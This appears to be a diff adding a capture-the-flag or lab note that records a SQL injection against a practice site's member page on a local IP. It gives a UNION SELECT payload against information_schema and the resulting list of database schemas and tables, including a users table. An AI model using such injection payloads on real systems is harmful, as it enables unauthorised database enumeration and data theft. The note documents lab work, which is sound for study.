@@ -1,0 +1,83 @@
+http://192.168.1.16/?page=member
+ID: 1 UNION SELECT table_schema, table_name FROM information_schema.tables--
+
+table_schema: Member_Brute_Force
+table_name : db_default
+
+table_schema: Member_Sql_Injection
+table_name : users
+
+table_schema: Member_guestbook
+table_name : guestbook
+
+table_schema: Member_images
+table_name : list_images
+
+table_schema: Member_survey
+table_name : vote_dbs
+
+
+table_schema: information_schema
+table_name : CHARACTER_SETS
+table_name : CLIENT_STATISTICS
+table_name : COLLATIONS
+table_name : COLLATION_CHARACTER_SET_APPLICABILITY
+table_name : COLUMNS
+table_name : COLUMN_PRIVILEGES
+table_name : ENGINES
+table_name : EVENTS
+table_name : FILES
+table_name : GLOBAL_STATUS
+table_name : GLOBAL_VARIABLES
+table_name : INDEX_STATISTICS
+table_name : KEY_CACHES
+table_name : KEY_COLUMN_USAGE
+table_name : PARAMETERS
+table_name : PARTITIONS
+table_name : PLUGINS
+table_name : PROCESSLIST
+table_name : PROFILING
+table_name : REFERENTIAL_CONSTRAINTS
+table_name : ROUTINES
+table_name : SCHEMATA
+table_name : SCHEMA_PRIVILEGES
+table_name : SESSION_STATUS
+table_name : SESSION_VARIABLES
+table_name : STATISTICS
+table_name : TABLES
+table_name : TABLESPACES
+table_name : TABLE_CONSTRAINTS
+table_name : TABLE_PRIVILEGES
+table_name : TABLE_STATISTICS
+table_name : TRIGGERS
+table_name : USER_PRIVILEGES
+table_name : USER_STATISTICS
+table_name : VIEWS
+table_name : INNODB_CMPMEM_RESET
+table_name : INNODB_RSEG
+table_name : INNODB_UNDO_LOGS
+table_name : INNODB_CMPMEM
+table_name : INNODB_SYS_TABLESTATS
+table_name : INNODB_LOCK_WAITS
+table_name : INNODB_INDEX_STATS
+table_name : INNODB_CMP
+table_name : INNODB_CMP_RESET
+table_name : INNODB_CHANGED_PAGES
+table_name : INNODB_BUFFER_POOL_PAGES
+table_name : INNODB_TRX
+table_name : INNODB_BUFFER_POOL_PAGES_INDEX
+table_name : INNODB_LOCKS
+table_name : INNODB_BUFFER_POOL_PAGES_BLOB
+table_name : INNODB_SYS_TABLES
+table_name : INNODB_SYS_FIELDS
+table_name : INNODB_SYS_COLUMNS
+table_name : INNODB_SYS_STATS
+table_name : QUERY_CACHE_INFO
+table_name : INNODB_SYS_INDEXES
+table_name : XTRADB_ADMIN_COMMAND
+table_name : INNODB_TABLE_STATS
+table_name : INNODB_SYS_FOREIGN_COLS
+table_name : INNODB_BUFFER_PAGE_LRU
+table_name : INNODB_BUFFER_POOL_STATS
+table_name : INNODB_BUFFER_PAGE
+table_name : INNODB_SYS_FOREIGN
